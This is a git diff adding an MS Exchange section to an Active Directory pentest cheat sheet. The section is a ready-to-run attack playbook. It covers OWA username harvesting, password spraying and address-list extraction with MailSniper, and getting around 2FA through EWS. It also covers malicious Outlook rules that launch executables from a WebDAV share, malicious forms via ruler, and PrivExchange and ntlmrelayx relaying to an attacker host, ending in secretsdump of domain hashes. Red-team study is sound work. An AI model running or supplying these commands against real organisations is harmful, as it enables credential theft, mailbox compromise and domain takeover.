@@ -17,6 +17,10 @@
   * [NTLMRelay](#NTLMRelay)
   * [GPO Abuse](#GPO-Abuse])
 * [MS Exchange](#MS-Exchange) 
+  * [Attacking externally](#Attacking externally)
+  * [Attacking from the inside](#Attacking from the inside)
+  * [MS Exchange escalating privileges](#MS Exchange escalating privileges)
+  * [NTLM Relay MS Exchange abuse](#NTLM Relay MS Exchange abuse)
 * [Delegation](#Delegation) 
   * [Unconstrained Delegation](#Unconstrained-delegation) 
     * [Printer Bug](#Printer-bug) 
@@ -43,7 +47,6 @@
   * [ACLs](#ACLs)
   * [Pam Trust](#Pam-Trust)
  
-
 ## Kerberoast
 - https://github.com/GhostPack/Rubeus
 #### Find user accounts used as service accounts
@@ -372,12 +375,17 @@ Add-DomainObjectAcl -Credential $creds -TargetIdentity "<OBJECT FQDN OR SID>" -R
 Get-ObjectAcl -Identity "<OBJECT FQDN OR SID>" -ResolveGUIDs | Where-Object -Property SecurityIdentifier -Match <SID OF USER WHO GETS GENERIC ALL>
 ```
 
-
 #### NTLMRelay
 - It is possible to abuse ACL with NTLMRelay abuse
 - Also possible to abuse Exchange Server: https://pentestlab.blog/2019/09/04/microsoft-exchange-domain-escalation/
 ```
 ntlmrelayx.py -t ldap://<DC IP> --escalate-user <USER>
+```
+
+#### Restore ACL's with aclpwn.py
+- NTLMRelayx performs acl attacks a restore file is sived that can be used to restore the ACL's
+```
+python3 aclpwn.py --restore aclpwn.restore
 ```
 
 ### GPO Abuse
@@ -391,11 +399,100 @@ net localgroup administrators
 ```
 
 ## MS Exchange
+- Outlook rules and Outlook Forms are synced to all clients with the mailbox active.
+- Outlook Forms VBSCript engine is different then the VBA Macro script engine (So disabling macro's wont defend against it)
+
+### Attacking externally
+- Attah path could be: Reconnaissance --> OWA Discovery --> Internal Domain Discovery --> Naming scheme fuzzing --> Username enumeration --> Password discovery --> GAL Extraction --> More Password discovery --> 2fa bypass --> Remote Access through VPN/RDP / Malicious Outlook Rules or Forms / Internal Phishing
+
+#### Collection of data (OSINT)
+- Collect e-mail adresses, usernames, passwords, get the email/user account naming scheme with tools such as:
+  - https://github.com/mschwager/fierce
+  - https://www.elevenpaths.com/innovation-labs/technologies/foca
+  - https://github.com/lanmaster53/recon-ng
+  - https://github.com/leebaird/discover
+  - https://github.com/laramies/theHarvester
+
+#### Domain name discovery
+- https://github.com/dafthack/MailSniper
+```
+Invoke-DomainHarvestOwa -ExchHostname <EXCH HOSTNAME> -OutFile <POTENTIAL_DOMAINS.TXT> -CompanyName "TARGET NAME"
+```
+- Internal Domain name may be found inside a SSL Certificate
+- https://github.com/dafthack/MailSniper
+
+#### Name scheme fuzzing
+- Create a username list from the OSINT
+- Could use https://github.com/dafthack/EmailAddressMangler to generate mangled username list
+```
+Invoke-EmailAddressMangler -FirstNamesList <TXT> -LastNameList <TXT> -AddresConvention fnln | Out-File -Encoding ascii namelist.txt
+```
+
+#### Username Enumeration
+- https://github.com/dafthack/MailSniper
+```
+Invoke-UsernameHarvestOWA -Userlist <TXT> -ExchHostname <EXCH HOSTNAME> -DOMAIN <IDENTIFIED INTERNAL DOMAIN NAME> -OutFile potential_usernames.txt
+```
+
+#### Password discovery
+- https://github.com/dafthack/MailSniper
+```
+Invoke-PasswordSprayOWA -ExchHostname <EXCH HOSTNAME> -Userlist potential_usernames.txt -Password <PASSWORD> -Threads 15 -Outfile owa-sprayed-creds.txt
+Invoke-PasswordSprayEWS -ExchHostname <EXCH HOSTNAME> -Userlist potential_usernames.txt -Password <PASSWORD> -Threads 15 -Outfile owa-sprayed-creds.txt
+```
+
+#### Global Address List (GAL) Extraction
+- https://els-cdn.content-api.ine.com/09f3f35f-6f69-4a9d-90be-d13046e692c0/index.html#
+```
+Get-GlobalAddressList -ExchHostname <EXCH HOSTNAME> -UserName <DOMAIN>\<USER> -Password <PASSWORD> -Verbose -OutFile global-address-list.txt
+```
+- Then you could spray passwords again to get access to more mail accounts!
+
+#### Bypassing 2fa
+- Can check by server responses if supplied password is correct or not.
+- Most 2FA vendors do not cover all available Exchange protocols. Owa might be protected but EWS might not be!
+
+```
+# Access through EWS
+Invoke-SelfSearch -Mailbox <MAIL ADDRESS> -ExchHostname <DOMAIN NAME> -remote
+```
+
+#### Spreading the compromise
+- Pillaging mailboxes for credentials/sensitive data
+  -  https://github.com/milo2012/owaDump (--keyword option)
+  -  https://github.com/dafthack/MailSniper (Invoke-SelfSearch)
+  -  https://github.com/xorrior/EmailRaider (Invoke-MailSearch)
+- Internal phishing
+  - Mail from internal email adresses to targets.
+- Malicious Outlook rules
+  - Two interested options: Start application and run a script (Start application is synced through Exchange server, run a script is not)
+  - Since Outlook 2016 both options are disabled by default
+  - Attack prequisites:
+    - Identification of valid credentials
+    - Exchange Service Access (via RPC or MAPI over HTTP)
+    - Malicious file dropped on disk (Through WebDAV share using UNC or local SMB share when physically inside) 
+  - The attack:
+    - Create a malicious executable (EXE, HTA, BAT, LNK etc.) and host it on an open WebDAV share
+    - Create a malicious Outlook rule using the rulz.py script, pointing the file path to your WebDAV share
+      - https://gist.github.com/monoxgas/7fec9ec0f3ab405773fc
+    - Run a local Outlook instance using the target's credentials and import the malicious rule you created (File --> Manager Rules & Alerts --> Options --> Improt rules)
+    - Send the trigger email. 
+- Malicious Outlook Forms
+  - If the path is applied that disables Run Application and Run Script rules this still works!
+  - Attack prequisites:
+    - Identification of valid credentials
+    - Exchange service access 
+  - KB4011091 for outlook 2016 seems to block VBSCript in forms
+  - https://github.com/sensepost/ruler/wiki/Forms
+  - ```.\ruler --email <EMAIL> form add --suffix form_name --input /tmp/command.txt --send```
+
+### Attacking from the inside
+- All the attacks from the outside works from the inside!
 - https://github.com/dafthack/MailSniper
 
 #### Enumerate all mailboxes
 ```
-Get-GlobalAddressList -ExchHostname us-exchange -Verbose -UserName <DOMAIN>\<USER> -Password <PASSWORD>
+Get-GlobalAddressList -ExchHostname <EXCH HOSTNAME> -UserName <DOMAIN>\<USER> -Password <PASSWORD> -Verbose -OutFile global-address-list.txt
 ```
 
 #### Check access to mailboxes with current user
@@ -408,6 +505,10 @@ Invoke-OpenInboxFinder -EmailList emails.txt -ExchHostname us-exchange -Verbose
 ```
 Invoke-SelfSearch -Mailbox <EMAIL> -ExchHostname <EXCHANGE SERVER NAME> -OutputCsv .\mail.csv
 ```
+
+#### Exchange ActiveSync
+- This attack applies when the DC and Exchange Server are hosted on the same machine
+- https://labs.mwrinfosecurity.com/blog/accessing-internal-fileshares-through-exchange-activesync/
 
 ### MS Exchange escalating privileges
 - Attack is performed cross domain, but can be done inside the domain. Just use the current domain instead of parent domain!
@@ -452,6 +553,31 @@ Add-DomainGroupMember -Identity $group -Members $user -Verbose
 
 ### NTLM Relay MS Exchange abuse
 - https://pentestlab.blog/2019/09/04/microsoft-exchange-domain-escalation/
+- https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/
+
+#### The attack using domain credentials
+- https://github.com/dirkjanm/privexchange/
+```
+python3 privexchange.py -ah <ATTACKER HOST> <EXCHANGE SERVER> -u Username -d <DOMAIN NAME>
+
+sudo python3 ntlmrelayx.py -t ldap://<DC FQDN> --escalate-user <USER>
+
+secretsdump.py <DOMAIN>/<USER>@<DC IP> -just-dc
+```
+
+#### The attack without credentials
+- using LLMNR/NBNS/mitm6 spoofing and https://github.com/dirkjanm/PrivExchange/blob/master/httpattack.py first
+- Really vague described in the INE slides. Never tried it either!
+```
+sudo python3 ntlmrelayx.py -t https://<EXCH HOST>/EWS/Exchange.asmx
+```
+
+#### Restore ACL's with aclpwn.py
+- NTLMRelayx performs acl attacks a restore file is sived that can be used to restore the ACL's
+
+```
+python3 aclpwn.py --restore aclpwn.restore
+```
 
 ## Delegation
 - In unconstrained and constrained Kerberos delegation, a computer/user is told what resources it can delegate authentications to;
@@ -786,7 +912,7 @@ Invoke-DNSUpdate -DNSType A -DNSName <HOSTNAME> -DNSData <IP ATTACKING MACHINE> 
 sudo ntlmrelayx.py -t ldaps://<DC IP> --http-port 8080 --delegate-access 
 ```
 
-#### Trigget target to authenticate to attacker machine
+#### Trigger target to authenticate to attacker machine
 - Use hostname we created in the DNS record
 ```
 python3 PetitPotam.py -d <DOMAIN> -u <USER> -p <PASSWORD> <HOSTNAME ATTACKER MACHINE>@8080/a <TARGET>
